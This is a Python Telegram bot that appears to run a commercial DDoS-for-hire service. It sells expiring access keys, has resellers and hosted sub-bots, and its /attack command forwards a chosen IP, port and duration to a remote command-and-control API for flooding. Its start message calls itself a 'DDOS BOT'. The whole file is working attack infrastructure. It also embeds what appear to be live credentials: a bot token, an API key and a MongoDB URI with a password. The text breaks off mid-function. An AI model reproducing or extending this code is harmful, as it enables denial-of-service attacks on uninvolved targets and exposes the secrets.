#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient

# ========== TIMEZONE (IST) ==========
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('%d %b %Y, %I:%M:%S %p') + " IST"

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAHj4cvF3Hxjgoqk7Dkq-1ZluwCH1GtElVk"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "F6XMND"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30
GLOBAL_MAX_ATTACK_TIME = 300   # MAX 300 seconds - Koi attack isse upar nahi ho sakta

# ========== MONGODB ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:aZVxaq4492K81EkC@monster.ydmmckl.mongodb.net/?appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]
broadcast_users_collection = db["broadcast_users"]

print("✅ MongoDB Connected!")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
hosted_bots = {}
hosted_bot_instances = {}
maintenance_mode = False

# ========== LOAD / SAVE HELPERS ==========
def load_users():
    data = users_collection.find_one({"_id": "users"})
    if not data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return data

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def load_keys():
    keys = {}
    for doc in keys_collection.find():
        keys[doc["key"]] = {
            "user_id": doc.get("user_id"),
            "duration_value": doc.get("duration_value"),
            "duration_unit": doc.get("duration_unit"),
            "generated_by": doc.get("generated_by"),
            "generated_at": doc.get("generated_at"),
            "expires_at": doc.get("expires_at"),
            "used": doc.get("used", False),
            "used_by": doc.get("used_by"),
            "used_at": doc.get("used_at")
        }
    return keys

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({"key": key, **info})

def load_groups():
    groups = {}
    for doc in groups_collection.find():
        groups[doc["group_id"]] = {
            "attack_time": doc.get("attack_time", 60),
            "added_by": doc.get("added_by"),
            "added_at": doc.get("added_at")
        }
    return groups

def save_groups(groups_data):
    groups_collection.delete_many({})
    for gid, info in groups_data.items():
        groups_collection.insert_one({"group_id": gid, **info})

def load_hosted_bots():
    bots = {}
    for doc in hosted_bots_collection.find():
        bots[doc["bot_token"]] = {
            "owner_id": doc.get("owner_id"),
            "owner_name": doc.get("owner_name"),
            "concurrent": doc.get("concurrent", 1),
            "max_attack_time": doc.get("max_attack_time", 300),
            "blocked": doc.get("blocked", False),
            "active_attacks": {},
            "users": doc.get("users", [])
        }
    return bots

def save_hosted_bots(bots_data):
    hosted_bots_collection.delete_many({})
    for token, info in bots_data.items():
        hosted_bots_collection.insert_one({
            "bot_token": token,
            "owner_id": info.get("owner_id"),
            "owner_name": info.get("owner_name"),
            "concurrent": info.get("concurrent", 1),
            "max_attack_time": info.get("max_attack_time", 300),
            "blocked": info.get("blocked", False),
            "users": info.get("users", [])
        })

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30, "global_max_attack_time": 300})
        return {"max_concurrent": 2, "cooldown": 30, "global_max_attack_time": 300}
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_broadcast_users():
    data = broadcast_users_collection.find_one({"_id": "broadcast_users"})
    if not data:
        broadcast_users_collection.insert_one({"_id": "broadcast_users", "users": []})
        return {"users": []}
    return data

def save_broadcast_users(data):
    broadcast_users_collection.update_one({"_id": "broadcast_users"}, {"$set": data}, upsert=True)

# ========== GLOBALS ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)
GLOBAL_MAX_ATTACK_TIME = settings.get("global_max_attack_time", 300)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key(prefix=""):
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    if prefix:
        return f"{prefix}-{suffix}"
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def get_total_active_count():
    now = time.time()
    for aid in list(active_attacks.keys()):
        if now >= active_attacks[aid]["finish_time"]:
            del active_attacks[aid]
    for token, bot_info in hosted_bots.items():
        for aid in list(bot_info.get("active_attacks", {}).keys()):
            if now >= bot_info["active_attacks"][aid]["finish_time"]:
                del bot_info["active_attacks"][aid]
                save_hosted_bots(hosted_bots)
    main_cnt = len(active_attacks)
    hosted_cnt = sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())
    return main_cnt + hosted_cnt

def check_active_attack_by_target(ip, port):
    target = f"{ip}:{port}"
    now = time.time()
    for info in active_attacks.values():
        if info["target_key"] == target and now < info["finish_time"]:
            return info
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for info in active_attacks.values():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({"target": info["target_key"], "user": info["user"], "remaining": remaining})
    status = []
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            r = slots[i]['remaining']
            time_str = f"{r//60}m {r%60}s" if r >= 60 else f"{r}s"
            status.append(f"❌ SLOT {i+1}: BUSY\n└ 🎯 {slots[i]['target']}\n└ 👤 {slots[i]['user']}\n└ ⏰ {time_str} left")
        else:
            status.append(f"✅ SLOT {i+1}: FREE\n└ 💡 Ready")
    return status

def check_user_expiry(user_id):
    now = time.time()
    for info in keys_data.values():
        if info.get("used_by") == user_id and info.get("used") and now < info["expires_at"]:
            return True
    return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        return all(0 <= int(p) <= 255 for p in ip.split('.'))
    return False

def validate_port(port):
    return 1 <= port <= 65535

def validate_duration(duration):
    return 10 <= duration <= 300   # Sirf 10 se 300 seconds tak

def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
    try:
        params = {"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1}
        resp = requests.get(API_URL, params=params, timeout=10)
        if resp.status_code == 200:
            time.sleep(duration)
            bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n🎯 {ip}:{port}\n⏱️ {duration}s\n📅 {format_ist_time(get_current_ist())}")
            return True
        else:
            bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {resp.status_code}")
            return False
    except:
        bot_instance.send_message(chat_id, "❌ API error! Server may be down.")
        return False

# ========== KEY CLEANUP ==========
def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        expired = []
        for key, info in keys_data.items():
            if info.get("used") and now > info["expires_at"]:
                expired.append(key)
        for key in expired:
            user_id = keys_data[key].get("used_by")
            if user_id and user_id not in ADMIN_ID:
                has_other = any(v.get("used_by") == user_id and v.get("used") and k != key and now < v["expires_at"] for k, v in keys_data.items())
                if not has_other and user_id in users:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                    try:
                        bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\nContact admin to get a new key.")
                    except:
                        pass
            del keys_data[key]
        if expired:
            save_keys(keys_data)

threading.Thread(target=cleanup_expired_keys, daemon=True).start()

def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for aid in list(active_attacks.keys()):
            if now >= active_attacks[aid]["finish_time"]:
                del active_attacks[aid]
        for token, bot_info in hosted_bots.items():
            changed = False
            for aid in list(bot_info.get("active_attacks", {}).keys()):
                if now >= bot_info["active_attacks"][aid]["finish_time"]:
                    del bot_info["active_attacks"][aid]
                    changed = True
            if changed:
                save_hosted_bots(hosted_bots)

threading.Thread(target=attack_cleanup, daemon=True).start()

# ========== HOSTED BOT CREATION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
                time.sleep(1)
            except:
                pass
            del hosted_bot_instances[bot_token]
        test = telebot.TeleBot(bot_token)
        test.remove_webhook()
        time.sleep(2)
        test.get_me()
        hbot = telebot.TeleBot(bot_token)
        hosted_bot_instances[bot_token] = hbot
        cooldown_data = {}
        bot_max_time = hosted_bots.get(bot_token, {}).get("max_attack_time", 300)

        @hbot.message_handler(commands=['start'])
        def hstart(msg):
            if msg.chat.type in ["group", "supergroup"]:
                gid = str(msg.chat.id)
                if gid in groups:
                    hbot.reply_to(msg, f"✨ GROUP BOT ✨\n✅ Approved\n⚡ Max Time: {groups[gid]['attack_time']}s\nCommands: /attack IP PORT, /help, /status")
                else:
                    hbot.reply_to(msg, "❌ Group not approved. Contact bot owner.")
                return
            current_time = format_ist_time(get_current_ist())
            hbot.reply_to(msg, f"🔥 DDOS BOT 🔥\n👑 Owner: {owner_name}\n⚡ Slots: {concurrent}\n📅 {current_time}\n\nCommands:\n/attack IP PORT TIME\n/redeem KEY\n/status\n/mykeys\n/cooldown\n/help")

        @hbot.message_handler(commands=['help'])
        def hhelp(msg):
            if msg.chat.type in ["group", "supergroup"]:
                hbot.reply_to(msg, "Commands: /attack IP PORT, /status, /help")
                return
            uid = str(msg.chat.id)
            if uid == owner_id:
                hbot.reply_to(msg, f"👑 Owner commands:\n/attack, /status, /cooldown, /second <10-300>\n/genkey, /mykeys, /removekey, /addgroup, /removegroup, /broadcast, /addreseller, /removereseller")
            elif uid in resellers:
                hbot.reply_to(msg, f"💎 Reseller commands:\n/attack, /status, /cooldown, /genkey, /mykeys")
            elif uid in hosted_bots.get(bot_token, {}).get("users", []):
                hbot.reply_to(msg, f"🔥 User commands:\n/attack IP PORT TIME\n/redeem KEY\n/status\n/mykeys\n/cooldown\n/help")
            else:
                hbot.reply_to(msg, "❌ Unauthorized. Use /redeem KEY to activate.")

        @hbot.message_handler(commands=['cooldown'])
        def hcooldown(msg):
            uid = str(msg.chat.id)
            if uid in cooldown_data:
                rem = cooldown_data[uid] - time.time()
                if rem > 0:
                    hbot.reply_to(msg, f"⏳ Cooldown: {int(rem)}s")
                    return
                del cooldown_data[uid]
            hbot.reply_to(msg, "✅ No cooldown")

        @hbot.message_handler(commands=['second'])
        def hsecond(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can change max attack time.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /second <10-300>")
                return
            try:
                new_max = int(args[1])
                if new_max < 10 or new_max > 300:
                    hbot.reply_to(msg, "❌ Value must be between 10 and 300 seconds.")
                    return
                hosted_bots[bot_token]["max_attack_time"] = new_max
                save_hosted_bots(hosted_bots)
                hbot.reply_to(msg, f"✅ Max attack time set to {new_max}s for this bot.")
            except:
                hbot.reply_to(msg, "❌ Invalid number.")

        @hbot.message_handler(commands=['addgroup'])
        def haddgroup(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can add groups.")
                return
            args = msg.text.split()
            if len(args) != 3:
                hbot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID SECONDS\nExample: /addgroup -100123456789 60")
                return
            gid = args[1]
            try:
                sec = int(args[2])
                if sec < 10 or sec > 300:
                    hbot.reply_to(msg, "❌ Attack time must be 10-300 seconds.")
                    return
            except:
                hbot.reply_to(msg, "❌ Invalid seconds.")
                return
            groups[gid] = {"attack_time": sec, "added_by": uid, "added_at": time.time()}
            save_groups(groups)
            hbot.reply_to(msg, f"✅ Group {gid} added with max {sec}s attack time.")

        @hbot.message_handler(commands=['removegroup'])
        def hremovegroup(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can remove groups.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
                return
            gid = args[1]
            if gid in groups:
                del groups[gid]
                save_groups(groups)
                hbot.reply_to(msg, f"✅ Group {gid} removed.")
            else:
                hbot.reply_to(msg, "❌ Group not found.")

        @hbot.message_handler(commands=['broadcast'])
        def hbroadcast(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can broadcast.")
                return
            if not msg.reply_to_message:
                hbot.reply_to(msg, "⚠️ Reply to a message you want to broadcast.")
                return
            user_list = hosted_bots.get(bot_token, {}).get("users", [])
            if not user_list:
                hbot.reply_to(msg, "No users to broadcast.")
                return
            success = 0
            for uid2 in user_list:
                try:
                    hbot.copy_message(uid2, msg.chat.id, msg.reply_to_message.message_id)
                    success += 1
                except:
                    pass
            hbot.reply_to(msg, f"✅ Broadcast sent to {success} users.")

        @hbot.message_handler(commands=['genkey'])
        def hgenkey(msg):
            uid = str(msg.chat.id)
            if uid != owner_id and uid not in resellers:
                hbot.reply_to(msg, "❌ Owner or reseller only.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /genkey 1 (day) or /genkey 5h")
                return
            val, unit = parse_duration(args[1])
            if not val:
                hbot.reply_to(msg, "❌ Invalid duration. Use 1 or 5h")
                return
            key = generate_key()
            expires = get_expiry_date(val, unit)
            keys_data[key] = {
                "user_id": "pending", "duration_value": val, "duration_unit": unit,
                "generated_by": uid, "generated_at": time.time(),
                "expires_at": expires.timestamp(), "used": False
            }
            save_keys(keys_data)
            hbot.reply_to(msg, f"✅ KEY GENERATED!\n🔑 `{key}`\n⏰ {format_duration(val, unit)}\n📅 Expires: {expires.strftime('%d %b %Y, %I:%M %p')}\nUser: /redeem {key}")

        @hbot.message_handler(commands=['mykeys'])
        def hmykeys(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can view generated keys.")
                return
            my = []
            for k, v in keys_data.items():
                if v.get("generated_by") == uid and not v.get("used"):
                    exp = datetime.fromtimestamp(v["expires_at"]).strftime('%d %b %Y, %I:%M %p')
                    my.append(f"🔑 {k}\n   {format_duration(v['duration_value'], v['duration_unit'])}\n   📅 {exp}")
            if my:
                hbot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my))
            else:
                hbot.reply_to(msg, "📋 No unused keys.")

        @hbot.message_handler(commands=['removekey'])
        def hremovekey(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can remove keys.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /removekey KEY")
                return
            key = args[1]
            if key in keys_data:
                del keys_data[key]
                save_keys(keys_data)
                hbot.reply_to(msg, f"✅ Key {key} removed.")
            else:
                hbot.reply_to(msg, "❌ Key not found.")

        @hbot.message_handler(commands=['addreseller'])
        def haddreseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can add resellers.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
                return
            rid = args[1]
            if rid not in resellers:
                resellers.append(rid)
                users_data["resellers"] = resellers
                save_users(users_data)
                hbot.reply_to(msg, f"✅ Reseller {rid} added.")
            else:
                hbot.reply_to(msg, "❌ Already a reseller.")

        @hbot.message_handler(commands=['removereseller'])
        def hremovereseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hbot.reply_to(msg, "❌ Only bot owner can remove resellers.")
                return
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
                return
            rid = args[1]
            if rid in resellers:
                resellers.remove(rid)
                users_data["resellers"] = resellers
                save_users(users_data)
                hbot.reply_to(msg, f"✅ Reseller {rid} removed.")
            else:
                hbot.reply_to(msg, "❌ Not a reseller.")

        @hbot.message_handler(commands=['redeem'])
        def hredeem(msg):
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 2:
                hbot.reply_to(msg, "⚠️ Usage: /redeem KEY")
                return
            key = args[1]
            if key not in keys_data:
                hbot.reply_to(msg, "❌ Invalid key.")
                return
            info = keys_data[key]
            if info.get("used"):
                hbot.reply_to(msg, "❌ Key already used.")
                return
            if time.time() > info["expires_at"]:
                hbot.reply_to(msg, "❌ Key expired.")
                del keys_data[key]
                save_keys(keys_data)
                return
            if uid not in hosted_bots[bot_token].get("users", []):
                hosted_bots[bot_token].setdefault("users", []).append(uid)
                save_hosted_bots(hosted_bots)
            info["used"] = True
            info["used_at"] = time.time()
            info["used_by"] = uid
            save_keys(keys_data)
            if uid not in users:
                users.append(uid)
                users_data["users"] = users
                save_users(users_data)
            expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            hbot.reply_to(msg, f"✅ ACCESS GRANTED!\n🎉 Activated for {format_duration(info['duration_value'], info['duration_unit'])}\n📅 Expires: {expiry}\n⚡ Concurrent: {concurrent}")

        @hbot.message_handler(commands=['status'])
        def hstatus(msg):
            if msg.chat.type in ["group", "supergroup"]:
                hbot.reply_to(msg, "Use /attack IP PORT (time is fixed by group settings)")
                return
            uid = str(msg.chat.id)
            now = time.time()
            my_attacks = []
            for ainfo in hosted_bots.get(bot_token, {}).get("active_attacks", {}).values():
                if ainfo["user"] == uid and now < ainfo["finish_time"]:
                    rem = int(ainfo["finish_time"] - now)
                    my_attacks.append(f"🎯 {ainfo['target_key']} ⏰ {rem}s")
            status_msg = f"📊 YOUR ATTACKS:\n" + ("\n".join(my_attacks) if my_attacks else "No active attacks") + f"\n\nGlobal active: {get_total_active_count()}/{MAX_CONCURRENT}"
            hbot.reply_to(msg, status_msg)

        @hbot.message_handler(commands=['attack'])
        def hattack(msg):
            uid = str(msg.chat.id)
            is_group = msg.chat.type in ["group", "supergroup"]
            if is_group:
                gid = str(msg.chat.id)
                if gid not in groups:
                    hbot.reply_to(msg, "❌ Group not approved.")
                    return
                max_time = groups[gid]["attack_time"]
                if max_time > 300:
                    max_time = 300
                args = msg.text.split()
                if len(args) != 3:
                    hbot.reply_to(msg, "⚠️ Group Usage: /attack IP PORT")
                    return
                ip, port = args[1], args[2]
                try:
                    port = int(port)
                    duration = max_time
                except:
                    hbot.reply_to(msg, "❌ Invalid port.")
                    return
                if not validate_port(port):
                    hbot.reply_to(msg, f"❌ Invalid port! Port must be between 1 and 65535. You entered: {port}")
                    return
            else:
                if uid not in users or not check_user_expiry(uid):
                    hbot.reply_to(msg, "❌ No active key. Use /redeem KEY")
                    return
                args = msg.text.split()
                if len(args) != 4:
                    hbot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
                    return
                ip, port, dur = args[1], args[2], args[3]
                try:
                    port = int(port)
                    duration = int(dur)
                except:
                    hbot.reply_to(msg, "❌ Invalid port or time.")
                    return
                if not validate_port(port):
                    hbot.reply_to(msg, f"❌ Invalid port! Port must be between 1 and 65535. You entered: {port}")
                    return
                if uid in cooldown_data:
                    rem = cooldown_data[uid] - time.time()
                    if rem > 0:
                        hbot.reply_to(msg, f"⏳ Wait {int(rem)}s")
                        return
                bot_max = hosted_bots.get(bot_token, {}).get("max_attack_time", 300)
                max_allowed = min(bot_max, 300)
                if duration < 10:
                    hbot.reply_to(msg, "❌ Minimum 10 seconds.")
                    return
                if duration > max_allowed:
                    hbot.reply_to(msg, f"❌ Max attack time is {max_allowed}s.")
                    return
                if duration > 300:
                    hbot.reply_to(msg, "❌ Maximum attack time is 300 seconds only.")
                    return

            if not validate_ip(ip):
                hbot.reply_to(msg, "❌ Invalid IP address!")
                return

            if get_total_active_count() >= MAX_CONCURRENT:
                hbot.reply_to(msg, f"❌ Global limit reached ({MAX_CONCURRENT}). Wait.")
                return
            if check_active_attack_by_target(ip, port):
                hbot.reply_to(msg, f"❌ Target {ip}:{port} already under attack.")
                return

            attack_id = f"hosted_{bot_token}_{uid}_{int(time.time())}_{random.randint(1000,9999)}"
            target_key = f"{ip}:{port}"
            finish = time.time() + duration
            hosted_bots.setdefault(bot_token, {}).setdefault("active_attacks", {})[attack_id] = {
                "user": uid, "finish_time": finish, "ip": ip, "port": port, "target_key": target_key
            }
            save_hosted_bots(hosted_bots)
            if not is_group:
                cooldown_data[uid] = time.time() + COOLDOWN_TIME
            hbot.reply_to(msg, f"✨ ATTACK LAUNCHED!\n🎯 {ip}:{port}\n⏱️ {duration}s\n🌐 Global active: {get_total_active_count()}/{MAX_CONCURRENT}")
            def run():
                send_attack_to_api(ip, port, duration, msg.chat.id, hbot, is_hosted=True)
                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                    del hosted_bots[bot_token]["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
            threading.Thread(target=run).start()

        def poll():
            try:
                hbot.infinity_polling()
            except:
                pass
        threading.Thread(target=poll, daemon=True).start()
        time.sleep(3)
        return True
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

@bot.message_handler(commands=['start'])
def start_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    if uid not in broadcast_users:
        broadcast_users.append(uid)
        save_broadcast_users({"users": broadcast_users})
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance mode.")
        return
    if chat_type in ["group", "supergroup"]:
        gid = str(msg.chat.id)
        if gid in groups:
            bot.reply_to(msg, f"✨ GROUP BOT ✨\n✅ Approved\n⚡ Max Time: {groups[gid]['attack_time']}s\nCommands: /attack IP PORT, /help, /status")
        else:
            bot.reply_to(msg, "❌ Group not approved. Contact owner.")
        return
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 OWNER PANEL
✅ Full Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
🌍 Max Attack Time: 300 seconds (MAX)
📅 {current_time}

Commands:
/attack, /status, /cooldown, /second <10-300>
/genkey, /trialkey, /removekey
/add, /remove, /addreseller, /removereseller
/addgroup, /removegroup, /allgroups
/host, /unhost, /allhosts
/maintenance, /broadcast, /stopattack
/allusers, /api_status
🛒 Buy: XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 RESELLER PANEL
✅ Reseller Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 {current_time}

Commands:
/attack, /status, /cooldown
/genkey, /mykeys
🛒 Buy: XSILENT""")
    elif uid in users:
        has_active = check_user_expiry(uid)
        status_text = "Active" if has_active else "Expired"
        bot.reply_to(msg, f"""🔥 USER PANEL
✅ Status: {status_text}
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 {current_time}

Commands:
/attack IP PORT TIME
/redeem KEY
/status
/mykeys
/cooldown
/help
🛒 Buy: XSILENT""")
    else:
        bot.reply_to(msg, f"❌ Unauthorized. Use /redeem KEY to activate.\n📅 {current_time}")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    if chat_type in ["group", "supergroup"]:
        bot.reply_to(msg, "Commands: /attack IP PORT, /status, /help")
        return
    if uid in ADMIN_ID:
        bot.reply_to(msg, "👑 Owner help:\n/attack, /status, /cooldown, /second <10-300>\n/genkey, /trialkey, /removekey\n/add, /remove, /addreseller, /removereseller\n/addgroup, /removegroup\n/host, /unhost\n/maintenance, /broadcast, /stopattack\n/allusers, /allgroups, /allhosts, /api_status")
    elif uid in resellers:
        bot.reply_to(msg, "💎 Reseller help:\n/attack, /status, /cooldown\n/genkey, /mykeys")
    elif uid in users:
        bot.reply_to(msg, "🔥 User help:\n/attack IP PORT TIME\n/redeem KEY\n/status\n/mykeys\n/cooldown")
    else:
        bot.reply_to(msg, "❌ Unauthorized. Use /redeem KEY to activate.")

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    if uid in cooldown:
        rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if rem > 0:
            bot.reply_to(msg, f"⏳ Cooldown: {int(rem)}s")
            return
        del cooldown[uid]
    bot.reply_to(msg, "✅ No cooldown")

@bot.message_handler(commands=['second'])
def second_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /second <10-300>")
        return
    try:
        new_max = int(args[1])
        if new_max < 10 or new_max > 300:
            bot.reply_to(msg, "❌ Must be between 10 and 300 seconds.")
            return
        global GLOBAL_MAX_ATTACK_TIME
        GLOBAL_MAX_ATTACK_TIME = new_max
        settings["global_max_attack_time"] = new_max
        save_settings(settings)
        bot.reply_to(msg, f"✅ Max attack time set to {new_max}s for ALL bots.\nMaximum allowed is 300 seconds.")
    except:
        bot.reply_to(msg, "❌ Invalid number.")

@bot.message_handler(commands=['attack'])
def attack_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = chat_type in ["group", "supergroup"]
    if is_group:
        gid = str(msg.chat.id)
        if gid not in groups:
            bot.reply_to(msg, "❌ Group not approved.")
            return
        max_time = groups[gid]["attack_time"]
        if max_time > 300:
            max_time = 300
        args = msg.text.split()
        if len(args) != 3:
            bot.reply_to(msg, "⚠️ Group Usage: /attack IP PORT")
            return
        ip, port = args[1], args[2]
        try:
            port = int(port)
            duration = max_time
        except:
            bot.reply_to(msg, "❌ Invalid port.")
            return
        if not validate_port(port):
            bot.reply_to(msg, f"❌ Invalid port! Port must be between 1 and 65535. You entered: {port}")
            return
    else:
        if uid not in users or not check_user_expiry(uid):
            bot.reply_to(msg, "❌ No active key. Use /redeem KEY")
            return
        args = msg.text.split()
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
            return
        ip, port, dur = args[1], args[2], args[3]
        try:
            port = int(port)
            duration = int(dur)
        except:
            bot.reply_to(msg, "❌ Invalid port or time.")
            return
        if not validate_port(port):
            bot.reply_to(msg, f"❌ Invalid port! Port must be between 1 and 65535. You entered: {port}")
            return
        if duration < 10:
            bot.reply_to(msg, "❌ Minimum 10 seconds.")
            return
        if duration > 300:
            bot.reply_to(msg, "❌ Maximum attack time is 300 seconds only.")
            return
        if uid in cooldown:
            rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
            if rem > 0:
                bot.reply_to(msg, f"⏳ Wait {int(rem)}s")
                return
    if not validate_ip(ip):
        bot.reply_to(msg, "❌ Invalid IP address!")
        return
    if get_total_active_count() >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ Global limit {MAX_CONCURRENT} reached. Wait.")
        return
    if check_active_attack_by_target(ip, port):
        bot.reply_to(msg, f"❌ Target {ip}:{port} already under attack.")
        return
    if not is_group:
        cooldown[uid] = time.time()
    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000,9999)}"
    target_key = f"{ip}:{port}"
    finish = time.time() + duration
    active_attacks[attack_id] = {"user": uid, "finish_time": finish, "ip": ip, "port": port, "target_key": target_key}
    bot.reply_to(msg, f"✨ ATTACK LAUNCHED!\n🎯 {ip}:{port}\n⏱️ {duration}s\n🌐 Global active: {get_total_active_count()}/{MAX_CONCURRENT}")
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot, False)
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized")
        return
    slots = format_attack_status()
    main_active = len(active_attacks)
    total = get_total_active_count()
    msg_txt = f"📊 MAIN BOT SLOTS\n📅 {format_ist_time(get_current_ist())}\n\n" + "\n\n".join(slots)
    msg_txt += f"\n\n📊 Main active: {main_active}/{MAX_CONCURRENT}"
    hosted_list = []
    for token, info in hosted_bots.items():
        for ainfo in info.get("active_attacks", {}).values():
            if time.time() < ainfo["finish_time"]:
                rem = int(ainfo["finish_time"] - time.time())
                hosted_list.append(f"🎯 {ainfo['target_key']}\n└ 👤 {ainfo['user']}\n└ 🤖 {info.get('owner_name','HOSTED')}\n└ ⏰ {rem}s")
    if hosted_list:
        msg_txt += "\n\n📊 HOSTED ATTACKS\n" + "\n\n".join(hosted_list)
